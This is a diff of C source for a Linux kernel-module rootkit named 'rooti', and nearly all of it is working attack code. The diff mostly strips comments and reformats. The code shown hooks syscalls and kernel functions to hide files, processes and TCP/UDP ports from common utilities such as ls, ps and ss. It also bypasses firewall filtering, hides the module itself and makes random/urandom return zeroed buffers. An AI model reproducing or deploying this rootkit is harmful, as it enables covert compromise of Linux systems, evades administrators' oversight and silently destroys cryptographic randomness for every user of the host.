@@ -41,14 +41,12 @@ enum rooti_signal {
 struct inode *utmp_inode;
 struct inode *proc_inode;
 
-// References to the original syscall handlers which we are hooking
 static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
 static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 static asmlinkage long (*orig_socket)(const struct pt_regs *regs);
 static asmlinkage long (*orig_setsockopt)(const struct pt_regs *regs);
 
-// References to other kernel functions which we are hooking
 static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
 static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
@@ -84,7 +82,6 @@ static asmlinkage long hook_pread64(const struct pt_regs *regs) {
     size_t count = regs->dx;
     struct file *file;
     
-    // Invoke the original syscall
     size_t nread = orig_pread64(regs);
     if (nread < 0)
         return nread;
@@ -109,7 +106,6 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
     struct file *file;
     int ret;
 
-    // Invoke the original syscall
     int nread = orig_getdents64(regs);
     if (nread < 0)
         return nread;
@@ -120,7 +116,6 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
         return nread;
     }
 
-    // Filter any files we wish to hide from the buffer
     ret = rooti_hide_dir_entries(user_buf, nread, file->f_inode == proc_inode);
 
     fput(file);
@@ -192,7 +187,7 @@ static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
         
         rooti_inject_traffic_filter(sock->sk, &user_fprog);
         break;
-        
+
     case SO_DETACH_FILTER:
         rooti_overwrite_traffic_filter(sock->sk);
         break;
@@ -208,11 +203,9 @@ static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     struct sock *socket = v;
 
-    // Check that this is not the header line and that the record is the one we want to hide
-    if (socket != SEQ_START_TOKEN && rooti_should_hide_tcp_port(socket->sk_num)) {
+    if (socket != SEQ_START_TOKEN && rooti_should_hide_tcp_port(socket->sk_num))
         return 0;
-    }
-    // Not the port to hide - call the original handler
+
     return orig_tcp4_seq_show(seq, v);
 }
 
@@ -220,15 +213,13 @@ static int hook_udp4_seq_show(struct seq_file *seq, void *v)
 {
     struct sock *socket = v;
 
-    // Check that this is not the header line and that the record is the one we want to hide
-    if (socket != SEQ_START_TOKEN && rooti_should_hide_udp_port(socket->sk_num)) {
+    if (socket != SEQ_START_TOKEN && rooti_should_hide_udp_port(socket->sk_num))
         return 0;
-    }
 
-    // Not the port to hide - call the original handler
     return orig_udp4_seq_show(seq, v);
 }
 
+// Should really be flagged as noreturn but that raises an objtool warning
 static void hook_do_exit(long code)
 {
     bool should_unload = rooti_pid_list_contains(current->pid, &rooti_lifetime_bound_pids);
@@ -243,7 +234,6 @@ static void hook_do_exit(long code)
 
 static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
 {
-    // Get the size of the user buffer and allocate a matching kernel buffer filled with zeros
     size_t len = iov_iter_count(iter);
     char *kernel_buf = kzalloc(len, GFP_KERNEL);
     if (kernel_buf == NULL) {
@@ -251,7 +241,6 @@ static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
         return -ENOMEM;
     }
 
-    // Copy the rigged buffer back into userspace
     int err = copy_to_iter(kernel_buf, len, iter);
     if (!err) {
         ROOTI_DEBUG("copy_to_iter() failed: %d", err);
@@ -264,8 +253,8 @@ static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
 }
 
 /* I am not going for full coverage of every possible system call that should be tampered with
- * in order to achieve our goals (because that would take eternity). Instead, this rootkit only
- * messes with system calls that are used by the common Linux utils (ls, ps, ss, who...) */
+ * in order (because that would take eternity). Instead, this rootkit only messes with system calls
+ which are used by the common Linux utils (ls, ps, ss, who...) */
 struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
@@ -279,7 +268,6 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK("urandom_read_iter", hook_random_read_iter, &orig_urandom_read_iter)
 };
 
-// LKM initialization
 static int __init rooti_init(void)
 {
     int err;
@@ -293,24 +281,20 @@ static int __init rooti_init(void)
     kern_path("/proc", LOOKUP_FOLLOW, &path);
     proc_inode = path.dentry->d_inode;
 
-    // Resolves the address of kallsyms_lookup_name for later use
     err = rooti_resolve_kln_addr();
     if (err) {
         ROOTI_DEBUG("rooti_resolve_kln_addr() failed: %d", err);
         return err;
     }
 
-    // Install function hooks :D
     err = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
     if (err) {
         ROOTI_DEBUG("rooti_install_hooks() failed: %d", err);
         return err;
     }
 
-    // Install firewall bypass hooks
     rooti_install_fw_bypass_hooks();
 
-    // If configured to be hidden by default, hide this rootkit
 #ifndef ROOTI_DEBUG_SHOWME
     err = rooti_hideme();
     if (err)
@@ -320,14 +304,11 @@ static int __init rooti_init(void)
     return 0;
 }
 
-// LKM cleanup
 static void __exit rooti_exit(void)
 {
     ROOTI_DEBUG("exit");
 
     rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
-
-    // Uninstall firewall bypassing hooks
     rooti_uninstall_fw_bypass_hooks();
     
     // Release any remaining records
